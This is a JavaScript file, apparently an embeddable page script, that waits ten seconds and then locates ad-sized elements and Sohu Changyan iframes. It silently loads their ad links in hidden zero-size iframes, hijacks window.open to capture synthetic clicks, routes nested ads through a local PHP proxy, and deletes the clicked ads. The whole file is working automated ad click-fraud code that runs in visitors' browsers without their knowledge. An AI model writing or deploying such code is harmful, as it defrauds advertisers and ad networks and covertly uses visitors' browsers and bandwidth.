(function () {
    if (!window.$) {
        window.$ = window.jQuery;
    }

    var triggerEvent = function (dom, type) {
        // 创建
        var evt = document.createEvent('HTMLEvents');

        // 初始化
        evt.initEvent(type, true, true);

        // 触发
        dom.dispatchEvent(evt);

        $(dom).trigger(type);
    };

    var isUrl = function (str) {
        if (str && str.indexOf('http') === 0) {
            return true;
        }
        return false;
    };

    var map = {};
    var rect = {};

    var findAdsWithSize = function (width, height, iframe) {
        var $dom = $('html');
        if (iframe) {
            $dom = $(iframe).contents();
        }
        return $dom.find('a#res0,img,iframe,embed,object').filter(function (index, item) {
            var $item = $(item);
            if ($item.width() == width && $item.height() == height) {
                return true;
            }
            return false;
        });
    };

    var findAdsWithDomain = function (domain, width, height, iframe) {
        var $dom = $('html');
        if (iframe) {
            $dom = $(iframe).contents();
        }
        return $dom.find('iframe').filter(function (index, item) {
            var $item = $(item);
            var src = $(item).attr('src');
            if (src) {
                src = src.replace(/^(http|https)\:\/\//gi, '');
                if (src.indexOf(domain) === 0 && $item.width() == width && $item.height() == height) {
                    return true;
                }
            }
            return false;
        });
    };

    var openAds = function (href, width, height) {
        if (width == undefined || height == undefined) {
            width = rect.width;
            height = rect.height;
        }
        var $iframe = $('<iframe height=0 width=0 />');
        $('body').append($iframe);
        $iframe.on('load', function (e) {
            $(this).remove();
            $('.iframe-ads-' + width + '-' + height).remove();
            if (map[width + '*' + height]) {
                var arr = map[width + '*' + height];
                for (var i = 0; i < arr.length; i++) {
                    if (arr[i].parent().tagName === 'BODY') {
                        arr[i].remove();
                    } else {
                        arr[i].parent().remove();
                    }
                }
                map[width + '*' + height] = [];
            }
        });
        $iframe.get(0).src = href;
    };

    var openIframeAds = function (src, width, height) {
        var $iframe = $('<iframe class="' + 'iframe-ads-' + width + '-' + height + '" height=0 width=0 />');
        $('body').append($iframe);
        $iframe.on('load', function (e) {
            autoOpenAds(width, height, this);
        });
        $iframe.get(0).src = '/PHPProxy/phpproxy.php?url=' + encodeURIComponent(src);
    };

    var handleAds = function (item, width, height) {
        var $ads = $(item);
        if ($ads.get(0).tagName === 'IFRAME') {
            var src = $ads.attr('src');
            if (src && src.indexOf('http') === 0) {
                openIframeAds(src, width, height);
                if (map[width + '*' + height]) {
                    map[width + '*' + height].push($ads);
                } else {
                    map[width + '*' + height] = [$ads];
                }
            } else {
                autoOpenAds(width, height, $ads.get(0));
            }
        } else {
            var $a = null;

            if ($ads.get(0).tagName === 'A') {
                $a = $ads;
            }

            if (!$a) {
                $a = $ads.siblings('a');
            }

            if ($a.length === 0) {
                $a = $ads.parents('a');
            }

            if ($a.length === 0) {
                $a = $ads.prev();
            }

            rect = {
                width: width,
                height: height
            };

            if (isUrl($a.attr('href'))) {
                openAds($a.attr('href'), width, height);
            } else {
                var wOpen = window.open;
                window.open = openAds;
                triggerEvent($a.get(0), 'click');
                window.open = wOpen;
            }

            if (map[width + '*' + height]) {
                map[width + '*' + height].push($a);
            } else {
                map[width + '*' + height] = [$a];
            }
        }
    };

    var autoOpenAds = function (width, height, iframe) {
        var iOpen = null;
        if (iframe && iframe.contentWindow) {
            iOpen = iframe.contentWindow.open;
            iframe.contentWindow.open = openAds;
        }

        var $ads = findAdsWithSize(width, height, iframe);

        if ($ads.length < 1) {
            return false;
        }

        $ads.each(function (index, item) {
            handleAds(item, width, height);
        });

        if (iframe && iframe.contentWindow) {
            iframe.contentWindow.open = iOpen;
        }

        return true;
    };

    var autoOpenDomainAds = function (domain, iwidth, iheight, width, height, iframe) {
        var $ads = findAdsWithDomain(domain, iwidth, iheight, iframe);

        if ($ads.length < 1) {
            return false;
        }

        $ads.each(function (index, item) {
            var $item = $(item);
            var src = $item.attr('src');
            openIframeAds(src, width, height);
            if (map[width + '*' + height]) {
                map[width + '*' + height].push($item);
            } else {
                map[width + '*' + height] = [$item];
            }
        });

        return true;
    };

    setTimeout(function () {
        autoOpenAds(300, 250);
        autoOpenAds(728, 90);
        autoOpenDomainAds('changyan.sohu.com', 650, 90, 728, 90);
    }, 10000);

})();